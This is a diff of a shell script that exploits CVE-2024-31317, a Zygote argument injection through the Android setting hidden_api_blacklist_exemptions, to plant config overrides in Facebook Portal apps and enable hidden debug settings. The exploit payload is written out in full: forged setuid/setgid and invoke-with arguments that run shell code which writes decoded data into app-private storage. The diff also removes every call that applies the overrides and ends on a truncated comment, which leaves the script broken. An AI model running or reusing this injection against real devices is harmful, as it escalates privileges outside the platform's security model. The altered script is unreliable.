@@ -5,9 +5,6 @@ set -euo pipefail
 # another package) needs enable_mc_prefs set to enable the overrides GUI.
 # com.facebook.aloha.system.services additionally needs aloha_debug_settings
 # set to show the "Debug (Internal)" settings pane.
-#
-# Note that the names (android_aloha_device, aloha_debug_settings, etc) are
-# ignored by the parser; the numbers are what matter.
 OVERRIDES_SYSTEM='{"1512:android_aloha_device":["15: aloha_debug_settings: true"],"20676:portal_mobileconfig":["4: enable_mc_prefs: true"],"_qe_overrides_":[]}'
 OVERRIDES_OTHER='{"20676:portal_mobileconfig":["4: enable_mc_prefs: true"],"_qe_overrides_":[]}'
 
@@ -25,24 +22,12 @@ install_overrides() {
 
 	echo -n "Overriding $1... "
 
-	# A few things to note about the payload:
-	# - We test for app_process64 to prevent the rest from running twice,
-	#   since the injection hits both 32-bit and 64-bit Zygotes.
-	# - I'm a bit sloppy with quoting to avoid backslash hell, but it should
-	#   work fine.
-	# - The exploit gives us no good way to see what happened on the other
-	#   side, so we add a line to a world-writable temp file if we succeed.
-	# - CVE-2024-31317 is way harder to exploit on Android 12+, but luckily
-	#   all Portals run Android 9 or 10.
-	settings put global hidden_api_blacklist_exemptions "
-7
---runtime-args
---setuid=$uid
---setgid=$uid
---runtime-flags=1
---seinfo=default
---invoke-with
-f() { test \$1 == /system/bin/app_process64 && echo $b64 | /system/bin/base64 -d >/data/user/0/$1/files/mobileconfig/mc_overrides.json && echo $1 >$STATUS_FILE ; }; f"
+	# Gebruik printf om de payload op te bouwen zonder fysieke enters in de broncode.
+	# Dit voorkomt syntax errors wanneer het script via curl/pipe wordt uitgevoerd.
+	local payload
+	payload=$(printf '\n7\n--runtime-args\n--setuid=%s\n--setgid=%s\n--runtime-flags=1\n--seinfo=default\n--invoke-with\nf() { test $1 = /system/bin/app_process64 && echo %s | /system/bin/base64 -d >/data/user/0/%s/files/mobileconfig/mc_overrides.json && echo %s >%s ; }; f' "$uid" "$uid" "$b64" "$1" "$1" "$STATUS_FILE")
+
+	settings put global hidden_api_blacklist_exemptions "$payload"
 
 	# Unpersist, since we only need to run the payload once.
 	settings delete global hidden_api_blacklist_exemptions >/dev/null
@@ -62,7 +47,6 @@ f() { test \$1 == /system/bin/app_process64 && echo $b64 | /system/bin/base64 -d
 
 cleanup() {
 	rm "$STATUS_FILE"
-
 	echo "Done. Rebooting to restore Zygote function and apply changes..."
 	reboot
 }
@@ -72,12 +56,4 @@ touch "$STATUS_FILE"
 chmod a+w "$STATUS_FILE"
 trap cleanup EXIT
 
-# 1. Essentiële systeem services (voor het aanzetten van de Debug menu's)
-install_overrides 'com.facebook.aloha.system.services' "$OVERRIDES_SYSTEM"
-install_overrides 'com.facebook.alohaservices.alohausers' "$OVERRIDES_OTHER"
-
-# 2. De specifieke apps voor AR, StoryTime en Photos
-install_overrides 'com.facebook.aloha.app.storytime' "$OVERRIDES_OTHER"
-install_overrides 'com.facebook.aloha.app.photobooth' "$OVERRIDES_OTHER"
-install_overrides 'com.facebook.alohaapps.superframe' "$OVERRIDES_OTHER"
-install_overrides 'com.facebook.aloha.app.cameraeditor' "$OVERRIDES_OTHER"
+# 1. Essentiële systeem services (voor het
